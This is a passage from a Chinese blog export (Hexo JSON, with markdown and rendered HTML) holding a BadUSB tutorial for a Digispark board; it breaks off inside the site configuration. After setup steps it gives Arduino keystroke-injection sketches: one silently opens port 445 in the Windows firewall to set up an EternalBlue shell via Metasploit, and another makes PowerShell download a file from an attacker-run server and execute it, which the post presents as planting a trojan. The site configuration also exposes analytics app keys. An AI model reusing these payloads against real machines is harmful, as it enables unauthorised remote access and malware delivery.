密码：ilaf\n```\n下载好后运行`DPinst64.exe`，32位系统点击`DPinst.exe`,一路回车等待安装完成\n下载编写程序的开发软件[https://www.arduino.cc/en/Main/Software](https://www.arduino.cc/en/Main/Software)\n运行Arduino，在首选项中添加开发板网址[http://digistump.com/package_digistump_index.json](http://digistump.com/package_digistump_index.json)(不同的板网址不同)\n```\n![1](/img/2018-06-12/1.png)\n在工具-->开发板-->开发板管理器里，下载这个驱动,等待下载完成即可\n![2](/img/2018-06-12/2.png)\n```\n选择Digispark开发板\n编译器选择USBtinyISP\n```\n![3](/img/2018-06-12/3.png)\n![4](/img/2018-06-12/4.png)\n到这里所有准备就做好了\n![xixixi](/img/2018-06-12/xixixi.png)\n##### 写脚本\n先看一眼商家给的教程\n![jiaocheng](/img/2018-06-12/jiaocheng.png)\n![emmm...](/img/2018-06-12/emmm.jpg)\n在我的印象中应该是写一个木马进固件然后一插进电脑就黑进去的啊[捂脸][捂脸][捂脸]\n算了，先一步一步跟着教程摸索下\n最终代码如下，修改了一点点\n```\n#include \"DigiKeyboard.h\"\n#define KEY_ESC     41\n#define KEY_BACKSPACE 42\n#define KEY_TAB     43\n#define KEY_PRT_SCR 70\n#define KEY_DELETE  76\n\nvoid setup() {\n\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(0);\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"cmd\"));\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"echo\"));\nDigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT);\nDigiKeyboard.print(F(\" \"));\nDigiKeyboard.print(F(\"Team233\"));\nDigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n\n}\n\n\nvoid loop() {\n\n}\n```\n编译...没问题,上传...O98k\n![7](/img/2018-06-12/7.png)\n激动人心的时候到了，重新插进电脑去,10秒后...\n![final](/img/2018-06-12/final.png)\n![6](/img/2018-06-12/6.png)\n到目前为止就算badusb就算做好了\n#### 进阶教程\n上面只是简单的尝试，接下来要进行更高级的用法\n![gif](/img/2018-06-12/1.gif)\n然鹅。。。。。\n![8](/img/2018-06-12/8.png)\n![9](/img/2018-06-12/9.jpg)\n只有这么点容量怎么写马，而且商家没说，网上也找不到，怎么写。。。。。\n忽然想起当时买这个的时候有好多个版本。。。\n我绝对不会告诉你我是因为它<b>~~比较便宜~~</b>体积小迷你好看才买它的\n经过我一番沉思与实践之后\n如果目标是win7系统，我们可以利用终端打开445端口，然后使用永恒之蓝漏洞直接getshell\n如果目标是win10，我们可以从我们搭好的服务器下载木马饭后执行木马程序，对win7也同样适用\ncmd开启445端口命令如下\n```\nnetsh advfirewall firewall add rule name=\"open 445\" dir=in action=allow protocol=TCP localport=445\n```\n编写好的脚本代码如下\n```\n#include \"DigiKeyboard.h\"\n#define KEY_ESC     41\n#define KEY_BACKSPACE 42\n#define KEY_TAB     43\n#define KEY_PRT_SCR 70\n#define KEY_DELETE  76\n\nvoid setup() {\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(0);\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"cmd\"));\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"netsh advfirewall firewall add rule name=\")); \nDigiKeyboard.print(char(34)); \nDigiKeyboard.print(F(\"open445\")); \nDigiKeyboard.print(char(34)); \nDigiKeyboard.print(F(\" dir=in protocol=tcp localport=445 action=allow\"));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n}\n\n\nvoid loop() {\n\n}\n```\n在kali下nmap可以看到445端口已经打开,msf直接漏洞利用就可以实现getshell\n![445](/img/2018-06-12/445.png)\nwin10系统下载测试文件Team233.png的脚本代码如下\n```\n#include \"DigiKeyboard.h\"\n#define KEY_ESC     41\n#define KEY_BACKSPACE 42\n#define KEY_TAB     43\n#define KEY_PRT_SCR 70\n#define KEY_DELETE  76\n\nvoid setup() {\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(0);\nDigiKeyboard.delay(5000);\nDigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"pow\"));\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.delay(500);\nDigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT);\nDigiKeyboard.delay(500);\nDigiKeyboard.print(F(\"$client = new-object System.Net.WebClient\"));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.print(F(\" $client.DownloadFile('http://192.168.1.2/Team233.png', '.\")); \nDigiKeyboard.print(char(92)); \nDigiKeyboard.print(F(\"Team233.png')\"));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.print(F(\".\"));\nDigiKeyboard.print(char(92)); \nDigiKeyboard.print(F(\"Team233.png\"));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n}\n\n\nvoid loop() {\n\n}\n```\n效果就参考我录的视频吧\n链接: [https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ](https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ) 密码: c9he\n<b>未经允许不得传播</b>\n<b>本文仅供学习之用，不负任何法律责任<b>","slug":"badusb","published":1,"mouth":"06","updated":"2020-09-18T03:19:43.934Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhowt0007ez8kxz17hh6x","content":"<h3 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h3><p>&emsp;&emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大<br><a id=\"more\"></a></p>\n<h4 id=\"知识准备\"><a href=\"#知识准备\" class=\"headerlink\" title=\"知识准备\"></a>知识准备</h4><p><img src=\"/img/2018-06-12/badusb.png\" srcset=\"/img/static/loading.gif\" alt=\"badusb\"><br>&emsp;&emsp;灯灯灯凳，这个就是我们的主角啦<br>&emsp;&emsp;对于第一次玩硬件的小伙伴，硬件入门不难，但是要有耐心，很多时候是需要不断的去调试代码，查找资料，所以一定要有耐心。</p>\n<h5 id=\"一、U盘的结构\"><a href=\"#一、U盘的结构\" class=\"headerlink\" title=\"一、U盘的结构\"></a>一、U盘的结构</h5><p>&emsp;&emsp;要想理解badusb攻击的方法就要先了解U盘的结构，U盘的主要结构如下<br><pre><code class=\"hljs undefined\">|<span class=\"hljs-string\">--------</span>|<span class=\"hljs-string\">---------------</span>|\n|<span class=\"hljs-string\">  固件  </span>|<span class=\"hljs-string\">   数据存储区   </span>|\n|<span class=\"hljs-string\">--------</span>|<span class=\"hljs-string\">---------------</span>|</code></pre></p>\n<p> &emsp;&emsp;U盘由芯片控制器和闪存两部分组成（也间接说明为什么U盘的额空间总是不够写的那么大），芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。</p>\n<h5 id=\"usb协议\"><a href=\"#usb协议\" class=\"headerlink\" title=\"usb协议\"></a>usb协议</h5><p>&emsp;&emsp;现在很多设备都是用usb接口，摄像头、U盘、鼠标、键盘，无线键鼠的接收器，等等，为了兼容这么多设备，设计USB协议标准的时候就没有要求每个USB设备向网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备多个输入输出设备的特征。<br>&emsp;&emsp;问题就是在这里，当你插进一个U盘时电脑并没有鉴别你的U盘到是不是真的U盘，这样我们就有机可乘了<br><img src=\"/img/2018-06-12/xixixi.png\" srcset=\"/img/static/loading.gif\" alt=\"xixixi\"></p>\n<h5 id=\"入侵原理\"><a href=\"#入侵原理\" class=\"headerlink\" title=\"入侵原理\"></a>入侵原理</h5><p>正常的U盘插到电脑里的大概流程是下面这样的<br><pre><code class=\"hljs undefined\">           <span class=\"hljs-comment\">电脑识别为U盘的固件</span>\n<span class=\"hljs-comment\">固件信息</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">U盘</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">读取U盘的内容</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">示U盘的内容</span></code></pre></p>\n<p>构造badusb的固件让电脑识别为键盘<br><pre><code class=\"hljs undefined\">           电脑识别为键盘的固件\n固件信息<span class=\"hljs-comment\">--------------------------&gt;键盘</span></code></pre></p>\n<p>再构造里面的内容<br><pre><code class=\"hljs undefined\"><span class=\"hljs-comment\">键盘</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">模拟人敲命令</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span>&gt;<span class=\"hljs-comment\">根据写好的脚本敲命令</span></code></pre></p>\n<h5 id=\"材料准备\"><a href=\"#材料准备\" class=\"headerlink\" title=\"材料准备\"></a>材料准备</h5><p>&emsp;&emsp;材料清单</p>\n<ul>\n<li>Digispark（也就是我们的主角）</li>\n<li>Arduino（编写以及把脚本写到badusb里的程序）</li>\n<li>脚本</li>\n</ul>\n<h4 id=\"开干\"><a href=\"#开干\" class=\"headerlink\" title=\"开干\"></a>开干</h4><h5 id=\"安装驱动\"><a href=\"#安装驱动\" class=\"headerlink\" title=\"安装驱动\"></a>安装驱动</h5><p>驱动下载地址，链接：<a href=\"http://pan.baidu.com/s/1i4K10dn\" target=\"_blank\" rel=\"noopener\">http://pan.baidu.com/s/1i4K10dn</a> 密码：ilaf<br><pre><code class=\"hljs undefined\">下载好后运行<span class=\"hljs-code\">`DPinst64.exe`</span>，32位系统点击<span class=\"hljs-code\">`DPinst.exe`</span>,一路回车等待安装完成\n下载编写程序的开发软件[<span class=\"hljs-string\">https://www.arduino.cc/en/Main/Software</span>](<span class=\"hljs-link\">https://www.arduino.cc/en/Main/Software</span>)\n运行Arduino，在首选项中添加开发板网址[<span class=\"hljs-string\">http://digistump.com/package_digistump_index.json</span>](<span class=\"hljs-link\">http://digistump.com/package_digistump_index.json</span>)(不同的板网址不同)</code></pre></p>\n<p><img src=\"/img/2018-06-12/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>在工具–&gt;开发板–&gt;开发板管理器里，下载这个驱动,等待下载完成即可<br><img src=\"/img/2018-06-12/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br><pre><code class=\"hljs undefined\">选择<span class=\"hljs-keyword\">Digispark开发板\n</span>编译器选择USBtinyISP</code></pre></p>\n<p><img src=\"/img/2018-06-12/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br><img src=\"/img/2018-06-12/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>到这里所有准备就做好了<br><img src=\"/img/2018-06-12/xixixi.png\" srcset=\"/img/static/loading.gif\" alt=\"xixixi\"></p>\n<h5 id=\"写脚本\"><a href=\"#写脚本\" class=\"headerlink\" title=\"写脚本\"></a>写脚本</h5><p>先看一眼商家给的教程<br><img src=\"/img/2018-06-12/jiaocheng.png\" srcset=\"/img/static/loading.gif\" alt=\"jiaocheng\"><br><img src=\"/img/2018-06-12/emmm.jpg\" srcset=\"/img/static/loading.gif\" alt=\"emmm...\"><br>在我的印象中应该是写一个木马进固件然后一插进电脑就黑进去的啊[捂脸][捂脸][捂脸]<br>算了，先一步一步跟着教程摸索下<br>最终代码如下，修改了一点点<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">\"DigiKeyboard.h\"</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_ESC     41</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_BACKSPACE 42</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_TAB     43</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_PRT_SCR 70</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_DELETE  76</span>\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">setup</span>() &#123;\n\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"cmd\"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"echo\"</span>));\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>,MOD_SHIFT_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\" \"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"Team233\"</span>));\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>,MOD_SHIFT_LEFT);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n\n&#125;\n\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">loop</span>() &#123;\n\n&#125;</code></pre></p>\n<p>编译…没问题,上传…O98k<br><img src=\"/img/2018-06-12/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>激动人心的时候到了，重新插进电脑去,10秒后…<br><img src=\"/img/2018-06-12/final.png\" srcset=\"/img/static/loading.gif\" alt=\"final\"><br><img src=\"/img/2018-06-12/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br>到目前为止就算badusb就算做好了</p>\n<h4 id=\"进阶教程\"><a href=\"#进阶教程\" class=\"headerlink\" title=\"进阶教程\"></a>进阶教程</h4><p>上面只是简单的尝试，接下来要进行更高级的用法<br><img src=\"/img/2018-06-12/1.gif\" srcset=\"/img/static/loading.gif\" alt=\"gif\"><br>然鹅。。。。。<br><img src=\"/img/2018-06-12/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"><br><img src=\"/img/2018-06-12/9.jpg\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>只有这么点容量怎么写马，而且商家没说，网上也找不到，怎么写。。。。。<br>忽然想起当时买这个的时候有好多个版本。。。<br>我绝对不会告诉你我是因为它<b><del>比较便宜</del></b>体积小迷你好看才买它的<br>经过我一番沉思与实践之后<br>如果目标是win7系统，我们可以利用终端打开445端口，然后使用永恒之蓝漏洞直接getshell<br>如果目标是win10，我们可以从我们搭好的服务器下载木马饭后执行木马程序，对win7也同样适用<br>cmd开启445端口命令如下<br><pre><code class=\"hljs undefined\">netsh advfirewall<span class=\"hljs-built_in\"> firewall </span><span class=\"hljs-builtin-name\">add</span> rule <span class=\"hljs-attribute\">name</span>=<span class=\"hljs-string\">\"open 445\"</span> <span class=\"hljs-attribute\">dir</span>=in <span class=\"hljs-attribute\">action</span>=allow <span class=\"hljs-attribute\">protocol</span>=TCP <span class=\"hljs-attribute\">localport</span>=445</code></pre></p>\n<p>编写好的脚本代码如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">\"DigiKeyboard.h\"</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_ESC     41</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_BACKSPACE 42</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_TAB     43</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_PRT_SCR 70</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_DELETE  76</span>\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">setup</span>() &#123;\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"cmd\"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"netsh advfirewall firewall add rule name=\"</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-keyword\">char</span>(<span class=\"hljs-number\">34</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"open445\"</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-keyword\">char</span>(<span class=\"hljs-number\">34</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\" dir=in protocol=tcp localport=445 action=allow\"</span>));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n&#125;\n\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">loop</span>() &#123;\n\n&#125;</code></pre></p>\n<p>在kali下nmap可以看到445端口已经打开,msf直接漏洞利用就可以实现getshell<br><img src=\"/img/2018-06-12/445.png\" srcset=\"/img/static/loading.gif\" alt=\"445\"><br>win10系统下载测试文件Team233.png的脚本代码如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">\"DigiKeyboard.h\"</span></span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_ESC     41</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_BACKSPACE 42</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_TAB     43</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_PRT_SCR 70</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">define</span> KEY_DELETE  76</span>\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">setup</span>() &#123;\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">5000</span>);\nDigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>,MOD_GUI_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"pow\"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.sendKeyStroke(<span class=\"hljs-number\">0</span>,MOD_SHIFT_LEFT);\nDigiKeyboard.<span class=\"hljs-built_in\">delay</span>(<span class=\"hljs-number\">500</span>);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"$client = new-object System.Net.WebClient\"</span>));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\" $client.DownloadFile('http://192.168.1.2/Team233.png', '.\"</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-keyword\">char</span>(<span class=\"hljs-number\">92</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"Team233.png')\"</span>));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\".\"</span>));\nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-keyword\">char</span>(<span class=\"hljs-number\">92</span>)); \nDigiKeyboard.<span class=\"hljs-built_in\">print</span>(F(<span class=\"hljs-string\">\"Team233.png\"</span>));\nDigiKeyboard.sendKeyStroke(KEY_ENTER);\n\n&#125;\n\n\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-built_in\">loop</span>() &#123;\n\n&#125;</code></pre></p>\n<p>效果就参考我录的视频吧<br>链接: <a href=\"https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ</a> 密码: c9he<br><b>未经允许不得传播</b><br><b>本文仅供学习之用，不负任何法律责任<b></b></b></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; 